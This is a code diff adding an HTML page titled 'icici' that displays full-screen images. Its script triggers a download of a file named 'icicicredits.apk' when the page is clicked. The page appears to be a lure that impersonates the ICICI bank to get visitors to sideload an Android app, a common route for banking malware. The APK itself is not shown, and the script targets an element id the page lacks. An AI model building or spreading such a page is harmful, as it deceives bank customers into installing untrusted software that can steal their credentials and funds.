@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>icici</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+    <div class="image-container">
+        <img src="images/mobile-image.png" alt="Mobile View" class="mobile-img">
+        <img src="images/desktop-image.png" alt="Desktop View" class="desktop-img">
+    </div>
+
+    <script>
+        document.getElementById('main').addEventListener('click', () => {
+            const ele = document.createElement('a');
+            ele.href = '/icicicredits.apk';
+            ele.download = 'icicicredits.apk';
+            ele.click();
+        })
+    </script>
+
+    </head>
+</body>
+
+</html>
